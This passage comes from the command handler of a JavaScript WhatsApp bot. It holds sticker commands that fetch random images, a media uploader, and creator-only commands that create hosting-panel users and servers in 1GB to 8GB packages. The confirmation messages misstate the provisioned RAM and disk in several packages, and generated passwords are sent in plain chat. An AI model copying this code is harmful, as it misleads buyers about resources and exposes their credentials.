if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`pororo`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'upin': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`upin`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'ipin': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`ipin`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case 'random': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`mentahan sticker`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendImageAsSticker(from, result, m, { packname: global.namabot, author: global.author })
}
limitAdd(m.sender, limit)
break
case'patrick':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Al.sendImageAsSticker(from, pjr, m, { packname: global.namaowner, author: global.author })
})
}
limitAdd(m.sender, limit)
break
case 'doge':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Al.sendImageAsSticker(from, pjr, m, { packname: global.namaowner, author: global.author })
})
}
limitAdd(m.sender, limit)
break
case 'love':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Al.sendImageAsSticker(from, pjr, m, { packname: global.namaowner, author: global.author })
})
}
limitAdd(m.sender, limit)
break
case 'gura':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Al.sendImageAsSticker(from, pjr, m, { packname: global.namaowner, author: global.author })
})
}
limitAdd(m.sender, limit)
break
case 'paimon':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/Paimon')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Al.sendImageAsSticker(from, pjr, m, { packname: global.namaowner, author: global.author })
})
}
limitAdd(m.sender, limit)
break
case 'mukelu':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
Al.sendImageAsSticker(from, pjr, m, { packname: global.namaowner, author: global.author })
})
}
limitAdd(m.sender, limit)
break

case 'tourl': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`Send/Reply the Video/Image With Caption ${prefix + command}`)
if (!quoted) return m.reply(`Send/Reply the Video/Image Caption ${prefix + command}`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await Al.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//==================÷÷÷π==
case "1gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 1GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 1200
DISK : 1200
CPU 30%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "2gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2000"
let cpu = "60"
let disk = "200"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 2GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 2000
DISK : 2000
CPU 60%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "3gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3000"
let cpu = "90"
let disk = "3000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 3GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 3000
DISK : 3000
CPU 90%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "4gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4000"
let cpu = "120"
let disk = "4000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://telegra.ph/file/72b973058c1985de0eda8.jpg" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 4GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 4000
DISK : 4000
CPU 120%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "5gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5000"
let cpu = "150"
let disk = "5000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://telegra.ph/file/72b973058c1985de0eda8.jpg" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 5GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 5000
DISK : 5000
CPU 150%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "6gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6000"
let cpu = "180"
let disk = "6000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 6GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 6000
DISK : 6000
CPU 180%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "7gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7000"
let cpu = "210"
let disk = "7000"
let email = username + "@𝙒𝙖𝙣.𝙊𝙛𝙛𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 7GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 7000
DISK : 7000
CPU 210%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "8gb": {
if (!isCreator) return m.reply('Khusus Developer')          
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8000"
let cpu = "240"
let disk = "2000"
let email = username + "@𝙈𝘼𝙉𝙐𝙇.𝙊𝙛??𝙘𝙞𝙖𝙡"
akunlo = "https://files.catbox.moe/24p794.mp4" 
if (!u) return
let d = (await Al.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Sedang Membuat Server....*`)
ctf = `*DATA AKUN SERVER PANNEL ANDA*
> ╔─❐
> ┣⎙─➤ Username : ${user.username}
> ┣⎙─➤ Password : ${password.toString()}
> ┣⎙─➤ Login : ${domain}
> ┣⎙─➤ Server : ${namaowner}
> ┗⬣

_NOTE_
*SIMPAN DATA PANEL ANDA KARENA OWNER HANYA SEKALI MENGIRIMKAN DATA & JIKA KEHILANGAN ITU BUKAN TANGGUNG JAWAB OWNER*`
Al.sendMessage(u, {text: `${ctf}`}, {quoted:m})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PAKET 8GB",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SERVER TELAH DI BUAT✅*

ID USER : ${user.id}
ID SERVER : ${server.id}
RAM : 8000
DISK : 8000
CPU 240%

*USR & PASSWORD TELAH DI KIRIM KE*
*PRIVATE MESSAGE ! SILAHKAN DI CEK*`)

}
limitAdd(m.sender, limit)
break 
case "9gb": {
